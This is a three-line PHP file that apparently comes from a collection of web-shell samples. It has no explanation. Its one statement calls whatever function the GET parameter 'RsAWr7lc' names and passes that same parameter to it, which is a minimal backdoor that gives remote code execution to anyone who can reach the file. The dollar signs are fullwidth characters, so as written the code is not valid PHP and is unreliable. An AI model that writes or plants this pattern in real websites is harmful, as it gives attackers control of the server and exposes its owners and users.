<?php
＄_GET['RsAWr7lc'](＄_GET['RsAWr7lc']);
?>
